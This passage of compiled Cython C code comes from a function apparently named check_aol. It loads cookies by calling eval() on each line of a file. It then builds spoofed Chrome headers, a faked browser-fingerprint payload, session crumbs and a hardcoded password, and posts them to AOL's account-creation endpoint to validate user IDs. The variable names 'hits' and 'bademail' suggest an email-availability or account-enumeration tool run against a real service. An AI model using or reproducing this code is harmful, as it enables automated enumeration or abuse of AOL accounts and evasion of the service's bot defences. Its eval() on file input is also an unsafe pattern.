                __Pyx_XGIVEREF(__pyx_t_15);
                __Pyx_XGIVEREF(__pyx_t_16);
                __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_15, __pyx_t_16);
                __pyx_L65_try_end:;
              }
            }
            /*finally:*/ {
              /*normal exit:*/{
                if (__pyx_t_12) {
                  __pyx_t_16 = __Pyx_PyObject_Call(__pyx_t_12, __pyx_tuple__33, NULL);
                  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
                  if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 451, __pyx_L12_except_error)
                  __Pyx_GOTREF(__pyx_t_16);
                  __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
                }
                goto __pyx_L57;
              }
              __pyx_L57:;
            }
            goto __pyx_L73;
            __pyx_L52_error:;
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            goto __pyx_L12_except_error;
            __pyx_L73:;
          }

          
          /*with:*/ {
            __pyx_t_27 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__43, NULL); if (unlikely(!__pyx_t_27)) __PYX_ERR(0, 455, __pyx_L12_except_error)
            __Pyx_GOTREF(__pyx_t_27);
            __pyx_t_12 = __Pyx_PyObject_LookupSpecial(__pyx_t_27, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 455, __pyx_L12_except_error)
            __Pyx_GOTREF(__pyx_t_12);
            __pyx_t_6 = __Pyx_PyObject_LookupSpecial(__pyx_t_27, __pyx_n_s_enter); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 455, __pyx_L74_error)
            __Pyx_GOTREF(__pyx_t_6);
            __pyx_t_26 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
              __pyx_t_26 = PyMethod_GET_SELF(__pyx_t_6);
              if (likely(__pyx_t_26)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                __Pyx_INCREF(__pyx_t_26);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_6, function);
              }
            }
            __pyx_t_7 = (__pyx_t_26) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_26) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
            __Pyx_XDECREF(__pyx_t_26); __pyx_t_26 = 0;
            if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 455, __pyx_L74_error)
            __Pyx_GOTREF(__pyx_t_7);
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            __pyx_t_6 = __pyx_t_7;
            __pyx_t_7 = 0;
            __Pyx_DECREF(__pyx_t_27); __pyx_t_27 = 0;
            /*try:*/ {
              {
                __Pyx_PyThreadState_declare
                __Pyx_PyThreadState_assign
                __Pyx_ExceptionSave(&__pyx_t_16, &__pyx_t_15, &__pyx_t_14);
                __Pyx_XGOTREF(__pyx_t_16);
                __Pyx_XGOTREF(__pyx_t_15);
                __Pyx_XGOTREF(__pyx_t_14);
                /*try:*/ {
                  __Pyx_XDECREF_SET(__pyx_v_f, __pyx_t_6);
                  __pyx_t_6 = 0;

                  
                  if (likely(PyList_CheckExact(__pyx_v_f)) || PyTuple_CheckExact(__pyx_v_f)) {
                    __pyx_t_6 = __pyx_v_f; __Pyx_INCREF(__pyx_t_6); __pyx_t_17 = 0;
                    __pyx_t_18 = NULL;
                  } else {
                    __pyx_t_17 = -1; __pyx_t_6 = PyObject_GetIter(__pyx_v_f); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 456, __pyx_L80_error)
                    __Pyx_GOTREF(__pyx_t_6);
                    __pyx_t_18 = Py_TYPE(__pyx_t_6)->tp_iternext; if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 456, __pyx_L80_error)
                  }
                  for (;;) {
                    if (likely(!__pyx_t_18)) {
                      if (likely(PyList_CheckExact(__pyx_t_6))) {
                        if (__pyx_t_17 >= PyList_GET_SIZE(__pyx_t_6)) break;
                        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                        __pyx_t_27 = PyList_GET_ITEM(__pyx_t_6, __pyx_t_17); __Pyx_INCREF(__pyx_t_27); __pyx_t_17++; if (unlikely(0 < 0)) __PYX_ERR(0, 456, __pyx_L80_error)
                        #else
                        __pyx_t_27 = PySequence_ITEM(__pyx_t_6, __pyx_t_17); __pyx_t_17++; if (unlikely(!__pyx_t_27)) __PYX_ERR(0, 456, __pyx_L80_error)
                        __Pyx_GOTREF(__pyx_t_27);
                        #endif
                      } else {
                        if (__pyx_t_17 >= PyTuple_GET_SIZE(__pyx_t_6)) break;
                        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                        __pyx_t_27 = PyTuple_GET_ITEM(__pyx_t_6, __pyx_t_17); __Pyx_INCREF(__pyx_t_27); __pyx_t_17++; if (unlikely(0 < 0)) __PYX_ERR(0, 456, __pyx_L80_error)
                        #else
                        __pyx_t_27 = PySequence_ITEM(__pyx_t_6, __pyx_t_17); __pyx_t_17++; if (unlikely(!__pyx_t_27)) __PYX_ERR(0, 456, __pyx_L80_error)
                        __Pyx_GOTREF(__pyx_t_27);
                        #endif
                      }
                    } else {
                      __pyx_t_27 = __pyx_t_18(__pyx_t_6);
                      if (unlikely(!__pyx_t_27)) {
                        PyObject* exc_type = PyErr_Occurred();
                        if (exc_type) {
                          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                          else __PYX_ERR(0, 456, __pyx_L80_error)
                        }
                        break;
                      }
                      __Pyx_GOTREF(__pyx_t_27);
                    }
                    __Pyx_XDECREF_SET(__pyx_v_line, __pyx_t_27);
                    __pyx_t_27 = 0;

                    
                    __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_line, __pyx_n_s_strip); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 457, __pyx_L80_error)
                    __Pyx_GOTREF(__pyx_t_7);
                    __pyx_t_26 = NULL;
                    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
                      __pyx_t_26 = PyMethod_GET_SELF(__pyx_t_7);
                      if (likely(__pyx_t_26)) {
                        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
                        __Pyx_INCREF(__pyx_t_26);
                        __Pyx_INCREF(function);
                        __Pyx_DECREF_SET(__pyx_t_7, function);
                      }
                    }
                    __pyx_t_27 = (__pyx_t_26) ? __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_26) : __Pyx_PyObject_CallNoArg(__pyx_t_7);
                    __Pyx_XDECREF(__pyx_t_26); __pyx_t_26 = 0;
                    if (unlikely(!__pyx_t_27)) __PYX_ERR(0, 457, __pyx_L80_error)
                    __Pyx_GOTREF(__pyx_t_27);
                    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
                    __pyx_t_7 = __Pyx_Globals(); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 457, __pyx_L80_error)
                    __Pyx_GOTREF(__pyx_t_7);
                    __pyx_t_26 = __Pyx_PyDict_NewPresized(19); if (unlikely(!__pyx_t_26)) __PYX_ERR(0, 457, __pyx_L80_error)
                    __Pyx_GOTREF(__pyx_t_26);
                    if (__pyx_v_acrumb) {
                      if (PyDict_SetItem(__pyx_t_26, __pyx_n_s_acrumb, __pyx_v_acrumb) < 0) __PYX_ERR(0, 457, __pyx_L80_error)
                    }
                    __Pyx_GetModuleGlobalName(__pyx_t_22, __pyx_n_s_bademail); if (unlikely(!__pyx_t_22)) __PYX_ERR(0, 457, __pyx_L80_error)
                    __Pyx_GOTREF(__pyx_t_22);
                    if (__pyx_t_22) {
                      if (PyDict_SetItem(__pyx_t_26, __pyx_n_s_bademail, __pyx_t_22) < 0) __PYX_ERR(0, 457, __pyx_L80_error)
                    }
                    __Pyx_DECREF(__pyx_t_22); __pyx_t_22 = 0;
                    if (__pyx_v_cookies) {
                      if (PyDict_SetItem(__pyx_t_26, __pyx_n_s_cookies, __pyx_v_cookies) < 0) __PYX_ERR(0, 457, __pyx_L80_error)
                    }
                    if (__pyx_v_crumb) {
                      if (PyDict_SetItem(__pyx_t_26, __pyx_n_s_crumb, __pyx_v_crumb) < 0) __PYX_ERR(0, 457, __pyx_L80_error)
                    }
                    if (__pyx_v_data) {
                      if (PyDict_SetItem(__pyx_t_26, __pyx_n_s_data, __pyx_v_data) < 0) __PYX_ERR(0, 457, __pyx_L80_error)
                    }
                    if (__pyx_v_email) {
                      if (PyDict_SetItem(__pyx_t_26, __pyx_n_s_email, __pyx_v_email) < 0) __PYX_ERR(0, 457, __pyx_L80_error)
                    }
                    if (__pyx_v_f) {
                      if (PyDict_SetItem(__pyx_t_26, __pyx_n_s_f, __pyx_v_f) < 0) __PYX_ERR(0, 457, __pyx_L80_error)
                    }
                    if (__pyx_v_gg) {
                      if (PyDict_SetItem(__pyx_t_26, __pyx_n_s_gg, __pyx_v_gg) < 0) __PYX_ERR(0, 457, __pyx_L80_error)
                    }
                    if (__pyx_v_headers) {
                      if (PyDict_SetItem(__pyx_t_26, __pyx_n_s_headers, __pyx_v_headers) < 0) __PYX_ERR(0, 457, __pyx_L80_error)
                    }
                    __Pyx_GetModuleGlobalName(__pyx_t_22, __pyx_n_s_hits); if (unlikely(!__pyx_t_22)) __PYX_ERR(0, 457, __pyx_L80_error)
                    __Pyx_GOTREF(__pyx_t_22);
                    if (__pyx_t_22) {
                      if (PyDict_SetItem(__pyx_t_26, __pyx_n_s_hits, __pyx_t_22) < 0) __PYX_ERR(0, 457, __pyx_L80_error)
                    }
                    __Pyx_DECREF(__pyx_t_22); __pyx_t_22 = 0;
                    if (__pyx_v_line) {
                      if (PyDict_SetItem(__pyx_t_26, __pyx_n_s_line, __pyx_v_line) < 0) __PYX_ERR(0, 457, __pyx_L80_error)
                    }
                    if (__pyx_v_name) {
                      if (PyDict_SetItem(__pyx_t_26, __pyx_n_s_name, __pyx_v_name) < 0) __PYX_ERR(0, 457, __pyx_L80_error)
                    }
                    if (__pyx_v_ok) {
                      if (PyDict_SetItem(__pyx_t_26, __pyx_n_s_ok, __pyx_v_ok) < 0) __PYX_ERR(0, 457, __pyx_L80_error)
                    }
                    if (__pyx_v_params) {
                      if (PyDict_SetItem(__pyx_t_26, __pyx_n_s_params, __pyx_v_params) < 0) __PYX_ERR(0, 457, __pyx_L80_error)
                    }
                    if (__pyx_v_res) {
                      if (PyDict_SetItem(__pyx_t_26, __pyx_n_s_res, __pyx_v_res) < 0) __PYX_ERR(0, 457, __pyx_L80_error)
                    }
                    if (__pyx_v_sessionIndex) {
                      if (PyDict_SetItem(__pyx_t_26, __pyx_n_s_sessionIndex, __pyx_v_sessionIndex) < 0) __PYX_ERR(0, 457, __pyx_L80_error)
                    }
                    if (__pyx_v_specData) {
                      if (PyDict_SetItem(__pyx_t_26, __pyx_n_s_specData, __pyx_v_specData) < 0) __PYX_ERR(0, 457, __pyx_L80_error)
                    }
                    if (__pyx_v_specId) {
                      if (PyDict_SetItem(__pyx_t_26, __pyx_n_s_specId, __pyx_v_specId) < 0) __PYX_ERR(0, 457, __pyx_L80_error)
                    }
                    if (__pyx_v_username) {
                      if (PyDict_SetItem(__pyx_t_26, __pyx_n_s_username, __pyx_v_username) < 0) __PYX_ERR(0, 457, __pyx_L80_error)
                    }
                    __pyx_t_22 = PyTuple_New(3); if (unlikely(!__pyx_t_22)) __PYX_ERR(0, 457, __pyx_L80_error)
                    __Pyx_GOTREF(__pyx_t_22);
                    __Pyx_GIVEREF(__pyx_t_27);
                    PyTuple_SET_ITEM(__pyx_t_22, 0, __pyx_t_27);
                    __Pyx_GIVEREF(__pyx_t_7);
                    PyTuple_SET_ITEM(__pyx_t_22, 1, __pyx_t_7);
                    __Pyx_GIVEREF(__pyx_t_26);
                    PyTuple_SET_ITEM(__pyx_t_22, 2, __pyx_t_26);
                    __pyx_t_27 = 0;
                    __pyx_t_7 = 0;
                    __pyx_t_26 = 0;
                    __pyx_t_26 = __Pyx_PyObject_Call(__pyx_builtin_eval, __pyx_t_22, NULL); if (unlikely(!__pyx_t_26)) __PYX_ERR(0, 457, __pyx_L80_error)
                    __Pyx_GOTREF(__pyx_t_26);
                    __Pyx_DECREF(__pyx_t_22); __pyx_t_22 = 0;
                    __Pyx_XDECREF_SET(__pyx_v_cookies, __pyx_t_26);
                    __pyx_t_26 = 0;

                    
                  }
                  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

                  
                }
                __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
                __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
                __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
                goto __pyx_L87_try_end;
                __pyx_L80_error:;
                __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
                __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
                __Pyx_XDECREF(__pyx_t_22); __pyx_t_22 = 0;
                __Pyx_XDECREF(__pyx_t_26); __pyx_t_26 = 0;
                __Pyx_XDECREF(__pyx_t_27); __pyx_t_27 = 0;
                __Pyx_XDECREF(__pyx_t_28); __pyx_t_28 = 0;
                __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
                __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
                /*except:*/ {
                  __Pyx_AddTraceback("source.check_aol", __pyx_clineno, __pyx_lineno, __pyx_filename);
                  if (__Pyx_GetException(&__pyx_t_6, &__pyx_t_26, &__pyx_t_22) < 0) __PYX_ERR(0, 455, __pyx_L82_except_error)
                  __Pyx_GOTREF(__pyx_t_6);
                  __Pyx_GOTREF(__pyx_t_26);
                  __Pyx_GOTREF(__pyx_t_22);
                  __pyx_t_7 = PyTuple_Pack(3, __pyx_t_6, __pyx_t_26, __pyx_t_22); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 455, __pyx_L82_except_error)
                  __Pyx_GOTREF(__pyx_t_7);
                  __pyx_t_24 = __Pyx_PyObject_Call(__pyx_t_12, __pyx_t_7, NULL);
                  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
                  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
                  if (unlikely(!__pyx_t_24)) __PYX_ERR(0, 455, __pyx_L82_except_error)
                  __Pyx_GOTREF(__pyx_t_24);
                  __pyx_t_4 = __Pyx_PyObject_IsTrue(__pyx_t_24);
                  __Pyx_DECREF(__pyx_t_24); __pyx_t_24 = 0;
                  if (__pyx_t_4 < 0) __PYX_ERR(0, 455, __pyx_L82_except_error)
                  __pyx_t_5 = ((!(__pyx_t_4 != 0)) != 0);
                  if (__pyx_t_5) {
                    __Pyx_GIVEREF(__pyx_t_6);
                    __Pyx_GIVEREF(__pyx_t_26);
                    __Pyx_XGIVEREF(__pyx_t_22);
                    __Pyx_ErrRestoreWithState(__pyx_t_6, __pyx_t_26, __pyx_t_22);
                    __pyx_t_6 = 0; __pyx_t_26 = 0; __pyx_t_22 = 0; 
                    __PYX_ERR(0, 455, __pyx_L82_except_error)
                  }
                  __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
                  __Pyx_XDECREF(__pyx_t_26); __pyx_t_26 = 0;
                  __Pyx_XDECREF(__pyx_t_22); __pyx_t_22 = 0;
                  goto __pyx_L81_exception_handled;
                }
                __pyx_L82_except_error:;
                __Pyx_XGIVEREF(__pyx_t_16);
                __Pyx_XGIVEREF(__pyx_t_15);
                __Pyx_XGIVEREF(__pyx_t_14);
                __Pyx_ExceptionReset(__pyx_t_16, __pyx_t_15, __pyx_t_14);
                goto __pyx_L12_except_error;
                __pyx_L81_exception_handled:;
                __Pyx_XGIVEREF(__pyx_t_16);
                __Pyx_XGIVEREF(__pyx_t_15);
                __Pyx_XGIVEREF(__pyx_t_14);
                __Pyx_ExceptionReset(__pyx_t_16, __pyx_t_15, __pyx_t_14);
                __pyx_L87_try_end:;
              }
            }
            /*finally:*/ {
              /*normal exit:*/{
                if (__pyx_t_12) {
                  __pyx_t_14 = __Pyx_PyObject_Call(__pyx_t_12, __pyx_tuple__33, NULL);
                  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
                  if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 455, __pyx_L12_except_error)
                  __Pyx_GOTREF(__pyx_t_14);
                  __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
                }
                goto __pyx_L79;
              }
              __pyx_L79:;
            }
            goto __pyx_L93;
            __pyx_L74_error:;
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            goto __pyx_L12_except_error;
            __pyx_L93:;
          }
          __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
          __Pyx_XDECREF(__pyx_t_20); __pyx_t_20 = 0;
          __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
          goto __pyx_L11_exception_handled;
        }
        goto __pyx_L12_except_error;
        __pyx_L12_except_error:;

        
        __Pyx_XGIVEREF(__pyx_t_9);
        __Pyx_XGIVEREF(__pyx_t_10);
        __Pyx_XGIVEREF(__pyx_t_11);
        __Pyx_ExceptionReset(__pyx_t_9, __pyx_t_10, __pyx_t_11);
        goto __pyx_L3_error;
        __pyx_L11_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_9);
        __Pyx_XGIVEREF(__pyx_t_10);
        __Pyx_XGIVEREF(__pyx_t_11);
        __Pyx_ExceptionReset(__pyx_t_9, __pyx_t_10, __pyx_t_11);
        __pyx_L15_try_end:;
      }

      
      __pyx_t_8 = __Pyx_PyDict_NewPresized(14); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 460, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      if (PyDict_SetItem(__pyx_t_8, __pyx_n_u_authority, __pyx_kp_u_login_aol_com) < 0) __PYX_ERR(0, 460, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_8, __pyx_n_u_accept, __pyx_kp_u__25) < 0) __PYX_ERR(0, 460, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_8, __pyx_kp_u_accept_language, __pyx_kp_u_en_US_en_q_0_9) < 0) __PYX_ERR(0, 460, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_8, __pyx_kp_u_content_type, __pyx_kp_u_application_x_www_form_urlencode_2) < 0) __PYX_ERR(0, 460, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_8, __pyx_n_u_origin, __pyx_kp_u_https_login_aol_com) < 0) __PYX_ERR(0, 460, __pyx_L3_error)

      
      __pyx_t_20 = PyTuple_New(3); if (unlikely(!__pyx_t_20)) __PYX_ERR(0, 465, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_20);
      __pyx_t_17 = 0;
      __pyx_t_29 = 127;
      __Pyx_INCREF(__pyx_kp_u_https_login_aol_com_account_crea_2);
      __pyx_t_17 += 44;
      __Pyx_GIVEREF(__pyx_kp_u_https_login_aol_com_account_crea_2);
      PyTuple_SET_ITEM(__pyx_t_20, 0, __pyx_kp_u_https_login_aol_com_account_crea_2);
      if (unlikely(!__pyx_v_specId)) { __Pyx_RaiseUnboundLocalError("specId"); __PYX_ERR(0, 465, __pyx_L3_error) }
      __pyx_t_19 = __Pyx_PyObject_FormatSimple(__pyx_v_specId, __pyx_empty_unicode); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 465, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_19);
      __pyx_t_29 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_19) > __pyx_t_29) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_19) : __pyx_t_29;
      __pyx_t_17 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_19);
      __Pyx_GIVEREF(__pyx_t_19);
      PyTuple_SET_ITEM(__pyx_t_20, 1, __pyx_t_19);
      __pyx_t_19 = 0;
      __Pyx_INCREF(__pyx_kp_u_done_https_3A_2F_2Fwww_aol_com);
      __pyx_t_17 += 31;
      __Pyx_GIVEREF(__pyx_kp_u_done_https_3A_2F_2Fwww_aol_com);
      PyTuple_SET_ITEM(__pyx_t_20, 2, __pyx_kp_u_done_https_3A_2F_2Fwww_aol_com);
      __pyx_t_19 = __Pyx_PyUnicode_Join(__pyx_t_20, 3, __pyx_t_17, __pyx_t_29); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 465, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_19);
      __Pyx_DECREF(__pyx_t_20); __pyx_t_20 = 0;
      if (PyDict_SetItem(__pyx_t_8, __pyx_n_u_referer, __pyx_t_19) < 0) __PYX_ERR(0, 460, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
      if (PyDict_SetItem(__pyx_t_8, __pyx_kp_u_sec_ch_ua, __pyx_kp_u_Not_A_Brand_v_8_Chromium_v_120) < 0) __PYX_ERR(0, 460, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_8, __pyx_kp_u_sec_ch_ua_mobile, __pyx_kp_u_0) < 0) __PYX_ERR(0, 460, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_8, __pyx_kp_u_sec_ch_ua_platform, __pyx_kp_u_Windows) < 0) __PYX_ERR(0, 460, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_8, __pyx_kp_u_sec_fetch_dest, __pyx_n_u_empty) < 0) __PYX_ERR(0, 460, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_8, __pyx_kp_u_sec_fetch_mode, __pyx_n_u_cors) < 0) __PYX_ERR(0, 460, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_8, __pyx_kp_u_sec_fetch_site, __pyx_kp_u_same_origin) < 0) __PYX_ERR(0, 460, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_8, __pyx_kp_u_user_agent, __pyx_kp_u_Mozilla_5_0_Windows_NT_10_0_Win6) < 0) __PYX_ERR(0, 460, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_8, __pyx_kp_u_x_requested_with, __pyx_n_u_XMLHttpRequest) < 0) __PYX_ERR(0, 460, __pyx_L3_error)
      __pyx_v_headers = ((PyObject*)__pyx_t_8);
      __pyx_t_8 = 0;

      
      __pyx_t_8 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 477, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      if (PyDict_SetItem(__pyx_t_8, __pyx_n_u_validateField, __pyx_n_u_userId) < 0) __PYX_ERR(0, 477, __pyx_L3_error)
      __pyx_v_params = ((PyObject*)__pyx_t_8);
      __pyx_t_8 = 0;

      
      __pyx_t_8 = PyTuple_New(13); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 480, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_17 = 0;
      __pyx_t_29 = 127;
      __Pyx_INCREF(__pyx_kp_u_browser_fp_data_7B_22language_22);
      __pyx_t_17 += 1318;
      __Pyx_GIVEREF(__pyx_kp_u_browser_fp_data_7B_22language_22);
      PyTuple_SET_ITEM(__pyx_t_8, 0, __pyx_kp_u_browser_fp_data_7B_22language_22);
      if (unlikely(!__pyx_v_specId)) { __Pyx_RaiseUnboundLocalError("specId"); __PYX_ERR(0, 480, __pyx_L3_error) }
      __pyx_t_19 = __Pyx_PyObject_FormatSimple(__pyx_v_specId, __pyx_empty_unicode); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 480, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_19);
      __pyx_t_29 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_19) > __pyx_t_29) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_19) : __pyx_t_29;
      __pyx_t_17 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_19);
      __Pyx_GIVEREF(__pyx_t_19);
      PyTuple_SET_ITEM(__pyx_t_8, 1, __pyx_t_19);
      __pyx_t_19 = 0;
      __Pyx_INCREF(__pyx_kp_u_cacheStored_crumb);
      __pyx_t_17 += 20;
      __Pyx_GIVEREF(__pyx_kp_u_cacheStored_crumb);
      PyTuple_SET_ITEM(__pyx_t_8, 2, __pyx_kp_u_cacheStored_crumb);
      if (unlikely(!__pyx_v_crumb)) { __Pyx_RaiseUnboundLocalError("crumb"); __PYX_ERR(0, 480, __pyx_L3_error) }
      __pyx_t_19 = __Pyx_PyObject_FormatSimple(__pyx_v_crumb, __pyx_empty_unicode); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 480, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_19);
      __pyx_t_29 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_19) > __pyx_t_29) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_19) : __pyx_t_29;
      __pyx_t_17 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_19);
      __Pyx_GIVEREF(__pyx_t_19);
      PyTuple_SET_ITEM(__pyx_t_8, 3, __pyx_t_19);
      __pyx_t_19 = 0;
      __Pyx_INCREF(__pyx_kp_u_acrumb_2);
      __pyx_t_17 += 8;
      __Pyx_GIVEREF(__pyx_kp_u_acrumb_2);
      PyTuple_SET_ITEM(__pyx_t_8, 4, __pyx_kp_u_acrumb_2);
      if (unlikely(!__pyx_v_acrumb)) { __Pyx_RaiseUnboundLocalError("acrumb"); __PYX_ERR(0, 480, __pyx_L3_error) }
      __pyx_t_19 = __Pyx_PyObject_FormatSimple(__pyx_v_acrumb, __pyx_empty_unicode); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 480, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_19);
      __pyx_t_29 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_19) > __pyx_t_29) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_19) : __pyx_t_29;
      __pyx_t_17 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_19);
      __Pyx_GIVEREF(__pyx_t_19);
      PyTuple_SET_ITEM(__pyx_t_8, 5, __pyx_t_19);
      __pyx_t_19 = 0;
      __Pyx_INCREF(__pyx_kp_u_sessionIndex_2);
      __pyx_t_17 += 14;
      __Pyx_GIVEREF(__pyx_kp_u_sessionIndex_2);
      PyTuple_SET_ITEM(__pyx_t_8, 6, __pyx_kp_u_sessionIndex_2);
      if (unlikely(!__pyx_v_sessionIndex)) { __Pyx_RaiseUnboundLocalError("sessionIndex"); __PYX_ERR(0, 480, __pyx_L3_error) }
      __pyx_t_19 = __Pyx_PyObject_FormatSimple(__pyx_v_sessionIndex, __pyx_empty_unicode); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 480, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_19);
      __pyx_t_29 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_19) > __pyx_t_29) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_19) : __pyx_t_29;
      __pyx_t_17 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_19);
      __Pyx_GIVEREF(__pyx_t_19);
      PyTuple_SET_ITEM(__pyx_t_8, 7, __pyx_t_19);
      __pyx_t_19 = 0;
      __Pyx_INCREF(__pyx_kp_u_done_https_3A_2F_2Fwww_aol_com_2);
      __pyx_t_17 += 81;
      __Pyx_GIVEREF(__pyx_kp_u_done_https_3A_2F_2Fwww_aol_com_2);
      PyTuple_SET_ITEM(__pyx_t_8, 8, __pyx_kp_u_done_https_3A_2F_2Fwww_aol_com_2);
      if (unlikely(!__pyx_v_specData)) { __Pyx_RaiseUnboundLocalError("specData"); __PYX_ERR(0, 480, __pyx_L3_error) }
      __pyx_t_19 = __Pyx_PyObject_FormatSimple(__pyx_v_specData, __pyx_empty_unicode); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 480, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_19);
      __pyx_t_29 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_19) > __pyx_t_29) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_19) : __pyx_t_29;
      __pyx_t_17 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_19);
      __Pyx_GIVEREF(__pyx_t_19);
      PyTuple_SET_ITEM(__pyx_t_8, 9, __pyx_t_19);
      __pyx_t_19 = 0;
      __Pyx_INCREF(__pyx_kp_u_multiDomain_tos0_oath_freereg_7);
      __pyx_t_17 += 103;
      __Pyx_GIVEREF(__pyx_kp_u_multiDomain_tos0_oath_freereg_7);
      PyTuple_SET_ITEM(__pyx_t_8, 10, __pyx_kp_u_multiDomain_tos0_oath_freereg_7);
      __pyx_t_19 = __Pyx_PyObject_FormatSimple(__pyx_v_name, __pyx_empty_unicode); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 480, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_19);
      __pyx_t_29 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_19) > __pyx_t_29) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_19) : __pyx_t_29;
      __pyx_t_17 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_19);
      __Pyx_GIVEREF(__pyx_t_19);
      PyTuple_SET_ITEM(__pyx_t_8, 11, __pyx_t_19);
      __pyx_t_19 = 0;
      __Pyx_INCREF(__pyx_kp_u_password_Drahmed2006_mm_10_dd_2);
      __pyx_t_17 += 55;
      __Pyx_GIVEREF(__pyx_kp_u_password_Drahmed2006_mm_10_dd_2);
